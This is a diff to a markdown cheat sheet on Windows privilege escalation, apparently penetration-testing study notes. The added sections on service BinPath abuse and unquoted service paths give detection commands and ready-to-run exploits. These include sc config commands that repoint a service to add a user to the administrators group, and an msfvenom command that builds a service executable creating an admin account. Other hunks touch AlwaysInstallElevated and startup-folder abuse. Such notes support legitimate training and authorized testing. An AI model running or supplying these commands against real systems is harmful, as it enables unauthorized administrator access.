@@ -98,8 +98,94 @@ Exploit - Always used a public exploit and never waste time compiling your own k
 - [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)    
 
 # Services
+When elevating our privileges through the services on a Windows machine, we search for services that run under system privileges and that we can manipulate in such a way that when the service restarts, our exploit is executed.
+
 ## BinPath
+Each Windows service specifies the location of the executable that has to be executed through the configuration variable 'BinPath'. If we can change the BinPath variable to the location of our payload and make it run under LocalSystem privileges, we are in.   
+**How to detect vulnerable services:** You are looking for services that you have write access to. This way you can adjust the binary path of the executable that is normally executed to the location of your exploit.   
+```
+# Check for what services we have write access by specifying one of our user roles (also check for the power users group)
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+
+# Check our permissions for one specific service
+accesschk.exe -ucqv daclsvc
+
+# Check under what privileges a system runs
+sc qc daclsvc
+```   
+You basically need one of the following permissions to the service and then you're good to go:   
+| Permission            | Why good for us?                                              |
+| SERVICE_CHANGE_CONFIG | Can reconfigure the service binary                            |
+| WRITE_DAC             | Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG |
+| WRITE_OWNER           | Can become owner, reconfigure permissions                     |
+| GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG                                |
+| GENERIC_ALL           |Inherits SERVICE_CHANGE_CONFIG                                 |
+> To elevate privileges the BinPath way, services don't have to be configured to run under LocalSystem. As we can alter the configuration, we can also specify under what privileges it should run.   
+#### Exploit  
+```
+# Change the privileges to LocalSystem if that is not yet the case
+sc config daclsvc obj= ".\LocalSystem" password= ""
+
+# add command in path
+sc config daclsvc binpath= "net localgroup administrators xhack /add"
+
+# restart service
+sc start daclsvc
+
+# verify if the user 'xhack' is succesfully added to the administrators group
+net localgroup Administrator
+```
+
 ## Unquoted Service Path
+If the service binary path is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. For example, if we have an executable in the following unquoted directory ```C:\Program Files\Unquoted Path Service\Common Files\uncsvc.exe```, then Windows will look for the executable consecutively in following paths:  
+```
+C:\Program.exe
+C:\Program Files\Unquoted.exe
+C:\Program Files\Unquoted Path Service\Common.exe
+C:\Program Files\Unquoted Path Service\Common Files\uncsvc.exe
+```
+If we can place our payload in one of previous locations and restart the service, our executable is run instead of the intended executable.   
+**How to detect vulnerable services:** You're looking for services that meet the following three criteria:  
+- The path of the binary location does not contain quotes    
+- Service runs under LocalSystem   
+- You have write access to one of the exploitable directories   
+```
+# Check for services in which the executable paths don't contain quotes
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+# Do following checks for unquoted service paths:
+#service runs under system (SERVICE_START_NAME: LocalSystem)
+sc qc unquotedsvc
+
+#extra verification if bin path is unquoted (BINARY_PATH_NAME)
+sc qc unquotedsvc
+
+#you have write access to one of these directories
+icacls "C:\ "
+icacls "C:\Program Files"
+icacls "C:\Program Files\Unquoted Path Service"
+```   
+#### Exploit
+```
+#Choose the name of the exploit according to the paths the system will look for the binaries
+#in our example below, we have write access to the "C:\Program Files\Unquoted Path Service\" directory
+C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+
+#Therefor we choose the name following binary name
+--> common.exe
+
+
+#create exploit
+msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o common.exe
+
+#place exploit in the target folder, so in here
+C:\Program Files\Unquoted Path Service\
+
+#restart service
+sc start unquotedsvc
+```
+
 ## Registry
 ## Executable File
 ## DLL Hijacking
@@ -118,7 +204,7 @@ dir /s C:\Users
 # Registry
 ## AutoRun
 ## AllwaysInstallElevated
-When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have ** system **.    
+When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have **system**.    
 #### detect vulnerability:   
 ```
 # check if AlwaysInstallElevated key is set
@@ -139,7 +225,7 @@ msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
 ## Detect
 ## Exploit
 # Startup Aplications
-##### Detect if vulnerable:
+#### Detect if vulnerable:
 ```
 #Check if you have write permissions to startup folder
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -150,7 +236,7 @@ icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 # Firewalled Services
 Some machines firewall several ports such that they are only accessible from the localhost. If we can execute code through services that are running as system, we can elevate our privileges to system.   
-##### Detect for vulnerable services:
+#### Detect for vulnerable services:
 ```
 # Check what interfaces are only available to the localhost (compare to your nmap scan)
 netstat -ano
@@ -158,7 +244,7 @@ netstat -ano
 # Check the executable from a specific service
 tasklist /fi "pid eq <PID>"
 ```   
-##### Exploit
+#### Exploit
 For databases, you can gain RCE through the command functionality or find passwords in the database itself.   
 
 When dealing with web apps that are only accessible to the localhost, we can forward them to our kali machine:
